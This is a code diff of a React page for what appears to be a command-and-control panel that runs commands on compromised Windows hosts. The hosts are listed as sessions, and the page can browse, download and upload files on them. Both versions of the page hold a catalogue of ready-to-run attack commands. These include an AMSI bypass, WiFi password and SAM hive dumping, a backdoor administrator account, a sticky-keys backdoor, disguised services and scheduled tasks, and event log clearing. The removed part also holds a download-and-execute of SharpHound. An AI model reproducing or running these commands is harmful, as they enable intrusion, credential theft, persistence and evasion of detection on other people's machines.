@@ -1,365 +1,519 @@
-import { useState, useRef } from 'react'
+import { useState, useMemo, useRef, useEffect } from 'react'
 import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
 import type { Session } from '../types'
-import { Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
-         Download, Upload, Copy, CheckCheck, X, ChevronRight,
-         Skull, Shield, Key, Globe, Database, Activity } from 'lucide-react'
+import {
+  Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
+  Download, Copy, CheckCheck, ChevronRight, ChevronDown,
+  Search, Hash, Upload, X,
+} from 'lucide-react'
 
-interface ExecResult { stdout: string; stderr: string; exit_code: number }
-interface FileInfo   { name: string; is_dir: boolean; size: number; mod_time: number }
-interface LsResp     { path: string; files: FileInfo[] }
-interface OutputEntry { cmd: string; result: string; ok: boolean; ts: number }
+// ─── Types ────────────────────────────────────────────────────────────────────
+interface ExecResult  { stdout: string; stderr: string; exit_code: number }
+interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number }
+interface LsResp      { path: string; files: FileInfo[] }
+interface Task        { id: number; cmd: string; result: string; ok: boolean; ts: number; open: boolean }
 
+// ─── Helpers ─────────────────────────────────────────────────────────────────
 function fmtBytes(b: number) {
-  if (b >= 1<<20) return `${(b/(1<<20)).toFixed(1)}M`
-  if (b >= 1024)  return `${(b/1024).toFixed(1)}K`
-  return `${b}B`
+  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
+  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
+  return `${b} B`
 }
 function joinWin(base: string, name: string) {
   return base.replace(/[/\\]+$/, '') + '\\' + name
 }
-
-// ─── Windows capability tabs ──────────────────────────────────────────────────
-
-const TABS_WIN = [
-  { id:'recon',   label:'🔍 Recon'       },
-  { id:'privesc', label:'⬆️ PrivEsc'     },
-  { id:'creds',   label:'🔑 Credentials' },
-  { id:'network', label:'🌐 Network'     },
-  { id:'files',   label:'📁 Files'       },
-  { id:'persist', label:'🔒 Persistence' },
-  { id:'ad',      label:'🏰 Active Dir'  },
-] as const
-type WinTab = typeof TABS_WIN[number]['id']
-
-const CAP: Record<WinTab, { icon: string; l: string; c: string }[]> = {
-  recon: [
-    { icon:'👤', l:'whoami /all',        c:'whoami /all' },
-    { icon:'💻', l:'systeminfo',         c:'systeminfo' },
-    { icon:'🔧', l:'OS / Patches',       c:'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief' },
-    { icon:'👥', l:'Local Users',        c:'net user' },
-    { icon:'🔑', l:'Admins',             c:'net localgroup administrators' },
-    { icon:'📋', l:'Processes',          c:'tasklist /v' },
-    { icon:'🕐', l:'Sched Tasks',        c:'schtasks /query /fo list /v | head -60' },
-    { icon:'⚙️', l:'Services',           c:'sc query type= all state= running' },
-    { icon:'📦', l:'Installed Software', c:'wmic product get Name,Version /format:csv | head -40' },
-    { icon:'🔌', l:'Autorun',            c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
-    { icon:'🔒', l:'AV / EDR',           c:'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value' },
-    { icon:'📝', l:'Event Log',          c:'wevtutil qe Security /c:10 /f:text /rd:true' },
-  ],
-  privesc: [
-    { icon:'🎭', l:'Privileges',         c:'whoami /priv' },
-    { icon:'🔑', l:'Token Info',         c:'whoami /groups /fo list' },
-    { icon:'📂', l:'Unquoted Svc Paths', c:'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv """' },
-    { icon:'📝', l:'Writable in PATH',   c:'for %A in ("%path:;=";"%") do ( if exist "%~A" ( cacls "%~A" 2>nul | findstr /i "everyone\\|users\\|authenticated" ) )' },
-    { icon:'🔧', l:'AlwaysInstallElev',  c:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul' },
-    { icon:'🛡️', l:'UAC Level',         c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin' },
-    { icon:'📁', l:'Writable Svc Dirs',  c:'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do (icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a)' },
-    { icon:'🔐', l:'PS Exec Policy',     c:'powershell -c "Get-ExecutionPolicy -List"' },
-    { icon:'💉', l:'PS AMSI Bypass',     c:'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); echo \'AMSI bypassed\'"' },
-    { icon:'🎪', l:'Potato Check',       c:'whoami /priv | findstr SeImpersonatePrivilege' },
-  ],
-  creds: [
-    { icon:'🔑', l:'Stored Creds',       c:'cmdkey /list' },
-    { icon:'📋', l:'Clipboard',          c:'powershell -c "Get-Clipboard"' },
-    { icon:'🌐', l:'IE Saved Creds',     c:'reg query "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2" 2>nul' },
-    { icon:'🔒', l:'DPAPI Blobs',        c:'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul | head -10' },
-    { icon:'🌍', l:'WiFi Passwords',     c:'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")' },
-    { icon:'🦊', l:'Firefox Creds',      c:'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul' },
-    { icon:'🌐', l:'Chrome Creds',       c:'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul' },
-    { icon:'📧', l:'Outlook Creds',      c:'reg query "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles" /s 2>nul | findstr /i "server\\|user\\|pass" | head -20' },
-    { icon:'📁', l:'Config Files',       c:'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".config .env .ini password secret" | head -20' },
-    { icon:'💀', l:'SAM (Hive)',          c:'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM' },
-  ],
-  network: [
-    { icon:'🌐', l:'IP Config',          c:'ipconfig /all' },
-    { icon:'🗺️', l:'ARP Table',         c:'arp -a' },
-    { icon:'🔌', l:'Open Ports',         c:'netstat -ano' },
-    { icon:'🛤️', l:'Routes',            c:'route print' },
-    { icon:'🌍', l:'DNS Cache',          c:'ipconfig /displaydns | head -40' },
-    { icon:'🏠', l:'Hosts File',         c:'type C:\\Windows\\System32\\drivers\\etc\\hosts' },
-    { icon:'📡', l:'Network Shares',     c:'net share && net use' },
-    { icon:'🔍', l:'Live Hosts',         c:'for /L %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i 2>nul | findstr "TTL" && echo 192.168.1.%i UP' },
-    { icon:'🔓', l:'Open Shares',        c:'net view /all 2>nul | head -20' },
-    { icon:'🛡️', l:'Firewall Rules',    c:'netsh advfirewall firewall show rule name=all | head -60' },
-  ],
-  files: [
-    { icon:'📂', l:'C:\\Users',          c:'dir C:\\Users' },
-    { icon:'🗑️', l:'Recycle Bin',       c:'dir /s /b C:\\$Recycle.Bin 2>nul | head -20' },
-    { icon:'📄', l:'Recent Docs',        c:'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\ 2>nul | head -20' },
-    { icon:'🔍', l:'Find Passwords',     c:'findstr /si "password" C:\\Users\\*\\*.txt C:\\Users\\*\\*.xml C:\\Users\\*\\*.ini 2>nul | head -20' },
-    { icon:'📁', l:'Interesting Files',  c:'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".kdbx .rdp .key .pem .pfx .p12 .crt .db .sqlite" | head -20' },
-    { icon:'💾', l:'Shadow Copies',      c:'vssadmin list shadows 2>nul' },
-    { icon:'📤', l:'Stage Loot',         c:'mkdir C:\\Windows\\Temp\\loot 2>nul & xcopy /q /e C:\\Users\\*\\Desktop C:\\Windows\\Temp\\loot\\ 2>nul & echo staged' },
-  ],
-  persist: [
-    { icon:'📝', l:'Run Keys (user)',    c:'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
-    { icon:'📝', l:'Run Keys (system)',  c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
-    { icon:'⏰', l:'Sched Task',         c:'schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "cmd.exe /c start /min cmd" /f' },
-    { icon:'⚙️', l:'New Service',       c:'sc create "WinDefSvc" binPath= "C:\\Windows\\Temp\\phantom.exe" start= auto && sc start WinDefSvc' },
-    { icon:'👤', l:'Backdoor User',     c:'net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add && net localgroup "Remote Desktop Users" backdoor /add' },
-    { icon:'🔑', l:'Sticky Keys',       c:'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe"' },
-    { icon:'📌', l:'Startup Folder',    c:'copy C:\\Windows\\Temp\\phantom.exe "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsDefender.exe"' },
-    { icon:'🗑️', l:'Clear Logs',        c:'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared' },
-  ],
-  ad: [
-    { icon:'🏰', l:'Domain Info',       c:'nltest /domain_trusts 2>nul && net view /domain 2>nul' },
-    { icon:'👑', l:'Domain Admins',     c:'net group "Domain Admins" /domain 2>nul' },
-    { icon:'🖥️', l:'Domain DCs',       c:'nltest /dclist: 2>nul' },
-    { icon:'🎫', l:'Kerberoast List',   c:'powershell -c "setspn -Q */* 2>nul | Select-String -Pattern \\"MSSQLSvc|TERMSRV|HTTP|WSMAN|cifs\\""' },
-    { icon:'🔍', l:'AD Users',          c:'net user /domain 2>nul | head -40' },
-    { icon:'📋', l:'GPO List',          c:'gpresult /R 2>nul | head -40' },
-    { icon:'🔓', l:'AS-REP Roastable',  c:'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"' },
-    { icon:'🗂️', l:'ADCS (certs)',     c:'certutil -CAInfo 2>nul && certutil -config - -ping 2>nul | head -10' },
-    { icon:'🌊', l:'BloodHound (fast)', c:'powershell -c "iex(iwr https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1)" 2>nul || echo needs-internet' },
-    { icon:'💰', l:'DCSync Check',      c:'powershell -c "([adsisearcher]\'(objectclass=domaindns)\').FindAll().Properties[\'Name\']"' },
-  ],
+function parentWin(p: string) {
+  const t = p.replace(/[/\\]+$/, '')
+  const i = Math.max(t.lastIndexOf('\\'), t.lastIndexOf('/'))
+  if (i <= 2) return t.slice(0, 3) // e.g. "C:\"
+  return t.slice(0, i)
 }
 
+// ─── Command catalogue ────────────────────────────────────────────────────────
+interface Cmd { icon: string; label: string; cmd: string; tag?: string }
+interface Cat { id: string; icon: string; label: string; atkId: string; cmds: Cmd[] }
+
+const CATS: Cat[] = [
+  {
+    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
+    cmds: [
+      { icon: '👤', label: 'whoami /all',          cmd: 'whoami /all',                                                    tag: 'T1033' },
+      { icon: '💻', label: 'systeminfo',            cmd: 'systeminfo',                                                     tag: 'T1082' },
+      { icon: '🔧', label: 'OS / Patches',          cmd: 'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief', tag: 'T1082' },
+      { icon: '👥', label: 'Local Users',           cmd: 'net user',                                                       tag: 'T1087' },
+      { icon: '🔑', label: 'Admins',                cmd: 'net localgroup administrators',                                  tag: 'T1069' },
+      { icon: '📋', label: 'Processes',             cmd: 'tasklist /v',                                                    tag: 'T1057' },
+      { icon: '⚙️', label: 'Running Services',      cmd: 'sc query type= all state= running',                              tag: 'T1007' },
+      { icon: '📦', label: 'Installed Software',    cmd: 'wmic product get Name,Version /format:csv',                     tag: 'T1518' },
+      { icon: '🔒', label: 'AV / EDR',              cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value', tag: 'T1518' },
+      { icon: '📝', label: 'Recent Event Log',      cmd: 'wevtutil qe Security /c:10 /f:text /rd:true',                  tag: 'T1005' },
+      { icon: '🔌', label: 'Autorun Keys',          cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
+      { icon: '🕐', label: 'Scheduled Tasks',       cmd: 'schtasks /query /fo list /v',                                   tag: 'T1053' },
+    ],
+  },
+  {
+    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
+    cmds: [
+      { icon: '🎭', label: 'Current Privileges',    cmd: 'whoami /priv',                                                   tag: 'T1134' },
+      { icon: '🔑', label: 'Token / Groups',        cmd: 'whoami /groups /fo list',                                       tag: 'T1134' },
+      { icon: '📂', label: 'Unquoted Svc Paths',    cmd: 'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "\\"',  tag: 'T1574' },
+      { icon: '🔧', label: 'AlwaysInstallElev',     cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul', tag: 'T1548' },
+      { icon: '🛡️', label: 'UAC Level',            cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA',    tag: 'T1548' },
+      { icon: '📁', label: 'Writable Svc Dirs',     cmd: 'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do @icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a', tag: 'T1574' },
+      { icon: '🔐', label: 'PS Exec Policy',        cmd: 'powershell -c "Get-ExecutionPolicy -List"',                     tag: 'T1059' },
+      { icon: '💉', label: 'AMSI Bypass',           cmd: 'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); Write-Output \'AMSI bypassed\'"', tag: 'T1562' },
+      { icon: '🎪', label: 'SeImpersonate (Potato)', cmd: 'whoami /priv | findstr SeImpersonatePrivilege',                tag: 'T1134' },
+      { icon: '🔓', label: 'PS Bypass + Base64',    cmd: 'powershell -nop -enc SABpAGQAZABlAG4A',                         tag: 'T1059' },
+    ],
+  },
+  {
+    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
+    cmds: [
+      { icon: '📋', label: 'Stored Creds (cmdkey)', cmd: 'cmdkey /list',                                                   tag: 'T1552' },
+      { icon: '📎', label: 'Clipboard',             cmd: 'powershell -c "Get-Clipboard"',                                 tag: 'T1115' },
+      { icon: '🌐', label: 'WiFi Passwords',        cmd: 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")', tag: 'T1552' },
+      { icon: '🦊', label: 'Firefox Profiles',      cmd: 'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul', tag: 'T1555' },
+      { icon: '🌐', label: 'Chrome Login Data',     cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul',    tag: 'T1555' },
+      { icon: '📧', label: 'Outlook Creds (reg)',   cmd: 'reg query "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles" /s 2>nul | findstr /i "server\\|user\\|pass"', tag: 'T1555' },
+      { icon: '🔑', label: 'DPAPI Blobs',           cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul',                 tag: 'T1555' },
+      { icon: '⚙️', label: 'Config / .env Files',   cmd: 'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".config .env .ini password secret"', tag: 'T1552' },
+      { icon: '💀', label: 'SAM Hive (needs SYSTEM)', cmd: 'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM', tag: 'T1003' },
+      { icon: '🕵️', label: 'LSASS PID',            cmd: 'tasklist | findstr lsass',                                       tag: 'T1003' },
+    ],
+  },
+  {
+    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
+    cmds: [
+      { icon: '🌐', label: 'IP Config',             cmd: 'ipconfig /all',                                                  tag: 'T1016' },
+      { icon: '🗺️', label: 'ARP Table',            cmd: 'arp -a',                                                         tag: 'T1016' },
+      { icon: '🔌', label: 'Open Ports (netstat)',  cmd: 'netstat -ano',                                                   tag: 'T1049' },
+      { icon: '🛤️', label: 'Routes',               cmd: 'route print',                                                    tag: 'T1016' },
+      { icon: '🌍', label: 'DNS Cache',             cmd: 'ipconfig /displaydns',                                           tag: 'T1016' },
+      { icon: '🏠', label: 'Hosts File',            cmd: 'type C:\\Windows\\System32\\drivers\\etc\\hosts',                tag: 'T1016' },
+      { icon: '📁', label: 'SMB Shares',            cmd: 'net share && net view /all 2>nul',                               tag: 'T1135' },
+      { icon: '🔥', label: 'Firewall Rules',        cmd: 'netsh advfirewall firewall show rule name=all | findstr /i "rule\\|enabled\\|action\\|direction" | head -40', tag: 'T1562' },
+      { icon: '📡', label: 'Proxy Settings',        cmd: 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer 2>nul', tag: 'T1090' },
+    ],
+  },
+  {
+    id: 'files', icon: '📁', label: 'FILE SYSTEM', atkId: 'TA0009',
+    cmds: [
+      { icon: '🏠', label: 'Users Dir',             cmd: 'dir C:\\Users',                                                  tag: 'T1083' },
+      { icon: '📝', label: 'Recent Docs',           cmd: 'dir /s /b C:\\Users\\*\\Recent 2>nul | head -20',               tag: 'T1083' },
+      { icon: '🔍', label: 'Find Password Files',   cmd: 'dir /s /b C:\\ 2>nul | findstr /i "password pass secret cred" | head -20', tag: 'T1083' },
+      { icon: '📄', label: 'Interesting Files',     cmd: 'dir /s /b C:\\Users 2>nul | findstr /i ".kdbx .pfx .pem .key .p12 .ovpn" | head -20', tag: 'T1005' },
+      { icon: '💾', label: 'Shadow Copies',         cmd: 'vssadmin list shadows 2>nul',                                   tag: 'T1490' },
+      { icon: '🌐', label: 'Web Config Files',      cmd: 'dir /s /b C:\\inetpub\\*web.config 2>nul & dir /s /b C:\\xampp\\*config* 2>nul', tag: 'T1005' },
+      { icon: '📋', label: 'PowerShell History',    cmd: 'type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul', tag: 'T1552' },
+    ],
+  },
+  {
+    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
+    cmds: [
+      { icon: '📝', label: 'Run Keys (HKCU/HKLM)',  cmd: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
+      { icon: '🕐', label: 'Scheduled Tasks List',  cmd: 'schtasks /query /fo list /v | findstr "Task Name:\\|Status:\\|Run As User:"', tag: 'T1053' },
+      { icon: '⚙️', label: 'New Sched Task',        cmd: 'schtasks /create /tn "WindowsUpdater" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru System /f 2>nul && echo created', tag: 'T1053' },
+      { icon: '🌐', label: 'New Service',           cmd: 'sc create "WinUpdate" binpath= "C:\\Windows\\Temp\\update.exe" start= auto && sc start WinUpdate 2>nul', tag: 'T1543' },
+      { icon: '👤', label: 'Add Backdoor User',     cmd: 'net user backd00r P@ssw0rd123! /add && net localgroup administrators backd00r /add && net localgroup "Remote Desktop Users" backd00r /add', tag: 'T1136' },
+      { icon: '🔑', label: 'Sticky Keys Backdoor',  cmd: 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f', tag: 'T1546' },
+      { icon: '📌', label: 'Startup Folder',        cmd: 'echo backdoor > "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat"', tag: 'T1547' },
+      { icon: '🗑️', label: 'Clear Event Logs',     cmd: 'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared', tag: 'T1070' },
+    ],
+  },
+  {
+    id: 'ad', icon: '🏰', label: 'ACTIVE DIRECTORY', atkId: 'TA0006',
+    cmds: [
+      { icon: '🏰', label: 'Domain Info',           cmd: 'nltest /domain_trusts 2>nul && net view /domain 2>nul',          tag: 'T1482' },
+      { icon: '👑', label: 'Domain Admins',         cmd: 'net group "Domain Admins" /domain 2>nul',                        tag: 'T1069' },
+      { icon: '🖥️', label: 'Domain Controllers',   cmd: 'nltest /dclist: 2>nul',                                          tag: 'T1018' },
+      { icon: '🔍', label: 'AD Users',              cmd: 'net user /domain 2>nul',                                         tag: 'T1087' },
+      { icon: '🎫', label: 'Kerberoast SPNs',       cmd: 'powershell -c "setspn -Q */*"',                                  tag: 'T1558' },
+      { icon: '🔓', label: 'AS-REP Roastable',      cmd: 'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"', tag: 'T1558' },
+      { icon: '🗂️', label: 'ADCS Certs',           cmd: 'certutil -CAInfo 2>nul',                                         tag: 'T1649' },
+      { icon: '📋', label: 'GPO Result',            cmd: 'gpresult /R 2>nul',                                              tag: 'T1615' },
+      { icon: '💰', label: 'DCSync Check',          cmd: 'powershell -c "([adsisearcher]\'(objectclass=domaindns)\').FindAll().Properties[\'Name\']"', tag: 'T1003' },
+    ],
+  },
+]
+
+// ─── Task counter ─────────────────────────────────────────────────────────────
+let _tid = 0
+
+// ─── Component ────────────────────────────────────────────────────────────────
 interface Props { onOpenTerminal: (id: string, name: string) => void }
 
 export default function Windows({ onOpenTerminal }: Props) {
-  const { data, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
+  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
   const sessions = (data ?? []).filter(s => s.os?.toLowerCase().includes('windows'))
 
-  const [selectedId, setSelectedId] = useState<string | null>(null)
-  const [activeTab,  setActiveTab]  = useState<WinTab>('recon')
-  const [executing,  setExecuting]  = useState(false)
-  const [outputs,    setOutputs]    = useState<OutputEntry[]>([])
-  const [customCmd,  setCustomCmd]  = useState('')
-  const [copied,     setCopied]     = useState(false)
+  const [selId,     setSelId]     = useState<string | null>(null)
+  const [tasks,     setTasks]     = useState<Task[]>([])
+  const [running,   setRunning]   = useState(false)
+  const [custom,    setCustom]    = useState('')
+  const [search,    setSearch]    = useState('')
+  const [openCats,  setOpenCats]  = useState<Set<string>>(new Set(['recon']))
+  const [showFs,    setShowFs]    = useState(false)
+  const [copied,    setCopied]    = useState<number | null>(null)
 
   // file browser
   const [fsPath,    setFsPath]    = useState('C:\\')
   const [fsData,    setFsData]    = useState<LsResp | null>(null)
   const [fsLoading, setFsLoading] = useState(false)
   const uploadRef = useRef<HTMLInputElement>(null)
-  const [uploading, setUploading] = useState(false)
-  const [uploadMsg, setUploadMsg] = useState<string | null>(null)
 
-  const selected = sessions.find(s => s.id === selectedId) ?? null
+  const sel = sessions.find(s => s.id === selId) ?? null
 
-  async function exec(cmd: string, label?: string) {
-    if (!selectedId) return
-    setExecuting(true)
+  async function exec(cmd: string, label: string) {
+    if (!selId || running) return
+    setRunning(true)
+    const id = ++_tid
     try {
-      const r = await apiPost<ExecResult>(`/api/sessions/${selectedId}/execute`, { command: cmd })
-      const out = (r.stdout || r.stderr || '(no output)').slice(0, 4000)
-      setOutputs(prev => [{ cmd: label ?? cmd.slice(0,60), result: out, ok: r.exit_code === 0, ts: Date.now() }, ...prev.slice(0,19)])
-    } catch(e) {
-      setOutputs(prev => [{ cmd: label ?? cmd.slice(0,60), result: String(e), ok: false, ts: Date.now() }, ...prev.slice(0,19)])
-    } finally { setExecuting(false) }
+      const r = await apiPost<ExecResult>(`/api/sessions/${selId}/execute`, { command: cmd })
+      const out = (r.stdout || r.stderr || '(no output)').slice(0, 8000)
+      setTasks(p => [{ id, cmd: label, result: out, ok: r.exit_code === 0, ts: Date.now(), open: true }, ...p].slice(0, 100))
+    } catch (e) {
+      setTasks(p => [{ id, cmd: label, result: String(e), ok: false, ts: Date.now(), open: true }, ...p].slice(0, 100))
+    } finally { setRunning(false) }
   }
 
   async function browseFs(path: string) {
-    if (!selectedId) return
+    if (!selId) return
     setFsLoading(true)
     try {
-      const ls = await apiFetch<LsResp>(`/api/sessions/${selectedId}/ls?path=${encodeURIComponent(path)}`)
+      const ls = await apiFetch<LsResp>(`/api/sessions/${selId}/ls?path=${encodeURIComponent(path)}`)
       setFsPath(ls.path); setFsData(ls)
-    } catch(e) { exec(`dir "${path}"`, `dir ${path}`) }
+    } catch { exec(`dir "${path}"`, `dir ${path}`) }
     finally { setFsLoading(false) }
   }
 
   function downloadFile(path: string) {
-    if (!selectedId) return
-    window.open(`/api/sessions/${selectedId}/download?path=${encodeURIComponent(path)}`, '_blank')
+    if (!selId) return
+    window.open(`/api/sessions/${selId}/download?path=${encodeURIComponent(path)}`, '_blank')
   }
 
   async function uploadFile(file: File) {
-    if (!selectedId) return
-    setUploading(true); setUploadMsg(null)
-    const form = new FormData(); form.append('file', file); form.append('path', fsPath + '\\' + file.name)
+    if (!selId) return
+    const form = new FormData()
+    form.append('file', file)
+    form.append('path', joinWin(fsPath, file.name))
     try {
-      const res = await fetch(`/api/sessions/${selectedId}/upload`, { method:'POST', body:form })
+      const res = await fetch(`/api/sessions/${selId}/upload`, { method: 'POST', body: form })
       if (!res.ok) throw new Error(await res.text())
-      const j = await res.json() as { path: string }
-      setUploadMsg(`✓ ${j.path}`); browseFs(fsPath)
-    } catch(e) { setUploadMsg(`✗ ${e}`) }
-    finally { setUploading(false) }
+      browseFs(fsPath)
+    } catch (e) { alert(String(e)) }
+  }
+
+  function copy(id: number, text: string) {
+    navigator.clipboard.writeText(text).then(() => {
+      setCopied(id); setTimeout(() => setCopied(null), 1500)
+    })
+  }
+
+  function toggleTask(id: number) {
+    setTasks(p => p.map(t => t.id === id ? { ...t, open: !t.open } : t))
+  }
+
+  function toggleCat(id: string) {
+    setOpenCats(prev => {
+      const s = new Set(prev)
+      s.has(id) ? s.delete(id) : s.add(id)
+      return s
+    })
+  }
+
+  const filteredCats = useMemo(() => {
+    const q = search.trim().toLowerCase()
+    if (!q) return CATS
+    return CATS.map(c => ({ ...c, cmds: c.cmds.filter(cmd => cmd.label.toLowerCase().includes(q)) }))
+               .filter(c => c.cmds.length > 0)
+  }, [search])
+
+  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')
+
+  function selectSession(id: string) {
+    setSelId(id); setTasks([]); setShowFs(false); setFsPath('C:\\'); setFsData(null)
   }
 
   return (
-    <div className="flex flex-col gap-3 h-full">
-      {/* Header */}
-      <div className="flex items-center justify-between shrink-0">
-        <h2 className="font-bold text-lg flex items-center gap-2 text-text">
-          <span className="text-xl">🪟</span> Windows
-          <span className="text-muted text-sm font-normal">({sessions.length} device{sessions.length !== 1 ? 's' : ''})</span>
-        </h2>
-        <button onClick={refresh} className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
-          <RefreshCw size={11} /> Refresh
-        </button>
-      </div>
+    <div className="flex h-full overflow-hidden rounded-lg border border-border bg-bg font-mono">
 
-      <div className="flex gap-3 flex-1 min-h-0">
-        {/* Left: device list */}
-        <div className="w-52 shrink-0 flex flex-col gap-1">
-          <div className="text-[9px] text-muted uppercase tracking-widest mb-1 px-1">Windows Devices</div>
-          {sessions.length === 0 ? (
-            <div className="bg-surface border border-border rounded-lg p-4 text-center">
-              <Monitor size={24} className="text-muted mx-auto mb-2" />
-              <p className="text-muted text-[10px]">No Windows sessions</p>
-            </div>
-          ) : sessions.map(s => (
-            <button key={s.id} onClick={() => { setSelectedId(s.id); setOutputs([]) }}
-              className={`w-full text-left rounded-lg border p-2.5 transition-all ${selectedId === s.id ? 'border-primary bg-primary/10' : 'border-border bg-surface hover:border-muted'}`}>
-              <div className="flex items-center gap-2">
-                <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />
-                <span className={`text-xs font-bold truncate ${selectedId === s.id ? 'text-primary' : 'text-text'}`}>{s.name}</span>
-              </div>
-              <div className="text-[9px] text-muted mt-1 pl-3.5 truncate">{s.username}@{s.hostname}</div>
-              <div className="text-[9px] text-muted pl-3.5 truncate">{s.remote_address}</div>
-            </button>
-          ))}
